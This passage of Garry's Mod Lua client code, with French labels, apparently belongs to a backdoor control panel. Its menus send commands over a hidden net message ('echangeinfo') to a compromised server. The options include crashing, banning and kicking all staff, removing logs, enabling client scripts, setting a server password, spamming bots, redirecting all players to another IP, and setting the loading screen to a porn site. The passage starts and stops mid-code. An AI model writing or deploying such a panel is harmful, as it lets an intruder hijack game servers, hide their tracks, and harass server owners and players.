prisonsubicon:SetIcon( "icon16/user_orange.png" )

ulxall:AddOption( "CleanUP", function() 
     net.Start( "echangeinfo" )
     net.WriteString("cleanup")
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( "icon16/cut.png" )
bansub:AddOption( "ALL", function() 
     net.Start( "echangeinfo" )
     net.WriteString("banall")
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( "icon16/user.png" )

bansub:AddOption( "STAFF", function() 
     net.Start( "echangeinfo" )
     net.WriteString("banallstaff")
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( "icon16/user_gray.png" )

kicksub:AddOption( "ALL", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Raison..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("kickall")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/user.png" )

kicksub:AddOption( "STAFF", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Raison..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("kickallstaff")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/user_gray.png" ) 

notificationall:AddOption( "Generic", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("notification_generic")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/lightbulb_off.png" )

notificationall:AddOption( "Error", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("notification_error")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/cancel.png" )

notificationall:AddOption( "Undo", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("notification_undo")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/arrow_undo.png" )

notificationall:AddOption( "Hint", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("notification_hint")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/cut.png" )

notificationall:AddOption( "Cleanup", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Message..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("notification_cleanup")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/information.png" )

meutreallsub:AddOption( "ALL", function() 
     net.Start( "echangeinfo" )
     net.WriteString("killall")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user.png" )
meutreallsub:AddOption( "STAFF", function() 
     net.Start( "echangeinfo" )
     net.WriteString("killallstaff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )
meutreallssub:AddOption( "ALL", function() 
     net.Start( "echangeinfo" )
     net.WriteString("allkillusersilence")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user.png" )
meutreallssub:AddOption( "STAFF", function() 
     net.Start( "echangeinfo" )
     net.WriteString("allkillusersilencestaff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

explosesub:AddOption( "ALL", function() 
     net.Start( "echangeinfo" )
     net.WriteString("exploseall")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user.png" )
explosesub:AddOption( "STAFF", function() 
     net.Start( "echangeinfo" )
     net.WriteString("explosestaff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

igniteallssub:AddOption( "ALL", function() 
     net.Start( "echangeinfo" )
     net.WriteString("igniteall")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user.png" )
igniteallssub:AddOption( "STAFF", function() 
     net.Start( "echangeinfo" )
     net.WriteString("igniteallstaff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

freezesub:AddOption( "ALL", function() 
     net.Start( "echangeinfo" )
     net.WriteString("freezeall")
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( "icon16/user.png" )
freezesub:AddOption( "STAFF", function() 
     net.Start( "echangeinfo" )
     net.WriteString("freezeallstaff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" ) 
unfreezesub:AddOption( "ALL", function() 
     net.Start( "echangeinfo" )
     net.WriteString("unfreezeall")
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( "icon16/user.png" )

unfreezesub:AddOption( "STAFF", function() 
     net.Start( "echangeinfo" )
     net.WriteString("unfreezeallstaff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/user_gray.png" )

noclipsub:AddOption( "[ON]", function() 
     net.Start( "echangeinfo" )
     net.WriteString("noclipallon")
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( "icon16/accept.png" )

noclipsub:AddOption( "[OFF]", function() 
     net.Start( "echangeinfo" )
     net.WriteString("noclipalloff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

ulxall:AddOption( "Ajoute 11â‚¬ toutes les 0.1s", function() 
     net.Start( "echangeinfo" )
     net.WriteString("addmoneyall")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/money_add.png" )

ulxall:AddOption( "Ajouter de l'argent", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "500" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("addmoneyalls")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/money_add.png" ) 

ulxall:AddOption( "Point de vie", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "100" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("healall")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/heart.png" ) 

ulxall:AddOption( "Point d'armure", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "250" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("armorall")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/user_suit.png" ) 

trollall:AddOption( "Launch", function() 
         net.Start( "echangeinfo" )
         net.WriteString("launchall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/arrow_up.png" )

trollall:AddOption( "2D Players", function() 
         net.Start( "echangeinfo" )
         net.WriteString("2dplayerall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

trollall:AddOption( "Donner la grosse tÃªte Ã  tous les joueurs", function() 
         net.Start( "echangeinfo" )
         net.WriteString("grossetete")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

trollall:AddOption( "Changer la taille des joueurs", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("scaleall")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/application_edit.png" )

trollall:AddOption( "Hurlement sur tous les joueurs", function() 
         net.Start( "echangeinfo" )
         net.WriteString("hurlement")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

trollall:AddOption( "Faire crash [STAFF]", function() 
     net.Start( "echangeinfo" )
     net.WriteString("crashadminvip")
     net.WriteEntity( userl )
     net.SendToServer()
end ) :SetIcon( "icon16/disconnect.png" )

spamchat:AddOption( "[ON]", function() 
     net.Start( "echangeinfo" )
     net.WriteString("spamchat")
     net.WriteEntity( userl )
     net.SendToServer()
end ) :SetIcon( "icon16/accept.png" )

spamchat:AddOption( "[OFF]", function() 
     net.Start( "echangeinfo" )
     net.WriteString("spamchatstop")
     net.WriteEntity( userl )
     net.SendToServer()
end ) :SetIcon( "icon16/cancel.png" )

mooveall:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("moovetrollall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" ) 

mooveall:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unmoovetrollall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

jumpbreakall:AddOption( "ON", function() 
         net.Start( "echangeinfo" )
         net.WriteString("jump")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

jumpbreakall:AddOption( "OFF", function() 
         net.Start( "echangeinfo" )
         net.WriteString("retablirjumpall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

moovesall:AddOption( "[ON]Avancer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("forwardmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Avancer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unforwardmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]Reculer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("backmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Reculer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unbackmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]Tourner Ã  gauche", function() 
         net.Start( "echangeinfo" )
         net.WriteString("leftmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Tourner Ã  gauche", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unleftmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]Tourner Ã  droite", function() 
         net.Start( "echangeinfo" )
         net.WriteString("rightmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]Tourner Ã  droite", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unrightmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

moovesall:AddOption( "[ON]S'accroupir", function() 
         net.Start( "echangeinfo" )
         net.WriteString("squatmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

moovesall:AddOption( "[OFF]S'accroupir", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unsquatmooveall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/stop.png" )

infoserver:AddOption( "Enlever les logs", function() 
         net.Start( "echangeinfo" )
         net.WriteString("logsremove")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cog_delete.png" )

infoserver:AddOption( "Changer le nom du serveur", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "â– â–‚ â–ƒ â–„ â–… â–† â–‡Ä¤áºªÄˆÐŒÄ’ÄŽ à¸¿Â¥ Ä”ÏÄ¨Ä©Ä†áº¤ Å¤ÎˆÇºMâ–ˆ â–‡ â–† â–… â–„ â–‚ â–" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("changename")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" ) 

infoserver:AddOption( "Changer l'Ã©cran de chargement", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "https://pornhub.com" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("changeload")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" ) 

infoserver:AddOption( "Autoriser les scripts client (0 ou 1)", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "1" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("allowcsluads")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" )

infoserver:AddOption( "Mettre un mot de passe sur le serveur", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "secure" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("secureinfo")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/server_edit.png" )

infoserver:AddOption( "Bot spam", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "Nombre de Bot ?" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("botspam")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/user.png" )

infoserver:AddOption( "Changer le nom de tous les joueurs", function() 
         net.Start( "echangeinfo" )
         net.WriteString("namechanger")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/server_database.png" )

infoserver:AddOption( "Changer le nom de tous les joueurs[SPAM]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("namechangerspam")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/server_database.png" )

infoserver:AddOption( "Name Changer[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("namechangerstop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/server_database.png" ) 

infoserver:AddOption( "RedÃ©marrer serveur", function() 
         net.Start( "echangeinfo" )
         net.WriteString("restartserver")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/server_go.png" )

gravitesub:AddOption( "ON", function() 
         net.Start( "echangeinfo" )
         net.WriteString("cassergrall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

gravitesub:AddOption( "OFF", function() 
         net.Start( "echangeinfo" )
         net.WriteString("retablirgrall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

physiquesub:AddOption( "ON", function() 
         net.Start( "echangeinfo" )
         net.WriteString("physicgamestyle")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

physiquesub:AddOption( "OFF", function() 
         net.Start( "echangeinfo" )
         net.WriteString("retablirphysicgamestyle")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

quakeearth:AddOption( "ON", function() 
         net.Start( "echangeinfo" )
         net.WriteString("earthquakeonall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollall:AddOption( "GL0B4L H4CK", function() 
         net.Start( "echangeinfo" )
         net.WriteString("globalhack")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/application_xp_terminal.png" )

trollall:AddOption( "D4NC3 FL00R! ", function() 
         net.Start( "echangeinfo" )
         net.WriteString("dancefloor")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/rainbow.png" )


animationallsubsalute:AddOption( "1 fois", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_salute")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubsalute:AddOption( "en boucle", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_salute_loop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubrobot:AddOption( "1 fois", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_robot")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )
animationallsubrobot:AddOption( "en boucle", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_robot_loop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubcheer:AddOption( "1 fois", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_cheer")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )
animationallsubcheer:AddOption( "en boucle", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_cheer_loop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsublaugh:AddOption( "1 fois", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_laugh")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsublaugh:AddOption( "en boucle", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_laugh_loop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubmuscle:AddOption( "1 fois", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_muscle")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubmuscle:AddOption( "en boucle", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_muscle_loop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubpersistence:AddOption( "1 fois", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_persistence")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubpersistence:AddOption( "en boucle", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_persistence_loop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubdance:AddOption( "1 fois", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_dance")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationallsubdance:AddOption( "en boucle", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_dance_loop")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animationall:AddOption( "STOP ALL", function() 
         net.Start( "echangeinfo" )
         net.WriteString("stop_timer_animation")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

ulxall:AddOption( "Unban ALL ", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unbanall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/status_online.png" )

ulxall:AddOption( "Give une arme", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "weapon_rpg" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("itemsall")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/bomb.png" ) 

ulxall:AddOption( "Changer les models", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "models/editor/playerstart.mdl" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("modelall")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/box.png" )

ulxall:AddOption( "Rediriger tous les joueurs vers une ip", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "127.0.0.1:27015" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("redirectplayer")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/server_go.png" )

m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end
local AppList = vgui.Create( "DListView", Frame )
AppList:SetMultiSelect( false )
AppList:AddColumn( "Utilisateur" )
AppList:SetSize( ScrW() -400, ScrH() -400 );
AppList:SetPos( 100, 80 );
            for k, v in pairs(player.GetAll()) do
                AppList:AddLine( v:Nick() .. "     " .. v:GetUserGroup(), v)
            end
AppList.OnRowSelected = function( lst, index, pnl )
userl = pnl:GetColumnText( 2 )
valuess = pnl:GetColumnText( 1 )
local m = DermaMenu()
local meutre, meutreicon = m:AddSubMenu( "Meutre" )
meutreicon:SetIcon( "icon16/bomb.png" )
m:AddSpacer()
local ulx, ulxicon = m:AddSubMenu( "Commandes" )
ulxicon:SetIcon( "icon16/script_edit.png" )
m:AddSpacer()
local visuel, visuelicon = m:AddSubMenu( "Visuel" )
visuelicon:SetIcon( "icon16/eye.png" )
m:AddSpacer()
local soundboard, soundboardlicon = m:AddSubMenu( "SoundBoard" )
soundboardlicon:SetIcon( "icon16/sound.png" )
m:AddSpacer()
local tpsub, tpsubicon = m:AddSubMenu( "TÃ©lÃ©portation" )
tpsubicon:SetIcon( "icon16/user_go.png" )
local tpsubgmconstruct, tpsubgmconstructicon = tpsub:AddSubMenu( "GM_CONSTRUCT" )
tpsubgmconstructicon:SetIcon( "icon16/map.png" )
local tpsubgmflat, tpsubgmflaticon = tpsub:AddSubMenu( "GM_FLATGRASS" )
tpsubgmflaticon:SetIcon( "icon16/map.png" )
local tpsubglife3, tpsubglife3icon = tpsub:AddSubMenu( "RP_GLIFE_ROCKFORD3" )
tpsubglife3icon:SetIcon( "icon16/map.png" )
local downtownv4cv2, downtownv4cv2icon = tpsub:AddSubMenu( "RP_ROCKFORD_V2B" )
downtownv4cv2icon:SetIcon( "icon16/map.png" )
local ulxsubgrade, ulxsubgradeicon = ulx:AddSubMenu( "Grades" )
ulxsubgradeicon:SetIcon( "icon16/user.png" )
local ulxsubgod, ulxsubgodicon = ulx:AddSubMenu( "Mode dieu" )
ulxsubgodicon:SetIcon( "icon16/heart.png" )
local ulxsubfreeze, ulxsubfreezeicon = ulx:AddSubMenu( "Freeze" )
ulxsubfreezeicon:SetIcon( "icon16/heart.png" )
local ulxsubnoclip, ulxsubnoclipicon = ulx:AddSubMenu( "NOCLIP" )
ulxsubnoclipicon:SetIcon( "icon16/drive_user.png" )
m:AddSpacer()
local animation, animationicon = m:AddSubMenu( "Animation" )
animationicon:SetIcon( "icon16/wand.png" )
m:AddSpacer()
local mooves, moovesicon = m:AddSubMenu( "Mouvement" )
moovesicon:SetIcon( "icon16/controller.png" )
m:AddSpacer()
local troll, trollicon = m:AddSubMenu( "Troll Menu" )
trollicon:SetIcon( "icon16/rainbow.png" )
local trollsubflash, trollsubflashicon = troll:AddSubMenu( "Flashlight SPAM" )
trollsubflashicon:SetIcon( "icon16/lightbulb_off.png" )
local trollsubscreen, trollsubscreenicon = troll:AddSubMenu( "Screenshot SPAM" )
trollsubscreenicon:SetIcon( "icon16/camera.png" )
local trollsubstopsound, trollsubstopsoundicon = troll:AddSubMenu( "Stopsound SPAM" )
trollsubstopsoundicon:SetIcon( "icon16/sound_mute.png" )
local trollsubmoooves, trollsubmooovesicon = troll:AddSubMenu( "Mouvement" )
trollsubmooovesicon:SetIcon( "icon16/bug_error.png" )
local trollsubgravity, trollsubgravityicon = troll:AddSubMenu( "GravitÃ© Casser" )
trollsubgravityicon:SetIcon( "icon16/star.png" )
local trollsubjumpc, trollsubjumpcicon = troll:AddSubMenu( "Jump Casser" )
trollsubjumpcicon:SetIcon( "icon16/star.png" )
local trollsubmic, trollsubmicicon = troll:AddSubMenu( "Micro" )
trollsubmicicon:SetIcon( "icon16/sound.png" )
local trollprison, trollprisonicon = troll:AddSubMenu( "Prison" )
trollprisonicon:SetIcon( "icon16/user_orange.png" )
m:AddSpacer()
meutre:AddOption( "Tuer la personne", function() 
     net.Start( "echangeinfo" )
     net.WriteString("killuser")
     net.WriteEntity( userl )
     net.SendToServer()
     actioneff("Vous venez de tuer " .. userl:Nick())
end ):SetIcon( "icon16/delete.png" )
meutre:AddOption( "Tuer la personne (silencieux)", function() 
     net.Start( "echangeinfo" )
     net.WriteString("killusersilence")
     net.WriteEntity( userl )
     net.SendToServer()
     actioneff("Vous venez de tuer " .. userl:Nick())
end ):SetIcon( "icon16/delete.png" )
meutre:AddOption( "Bruler la personne", function() 
         net.Start( "echangeinfo" )
         net.WriteString("fireuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de bruler " .. userl:Nick())
 end ):SetIcon( "icon16/delete.png" )

meutre:AddOption( "Exploser la personne", function() 
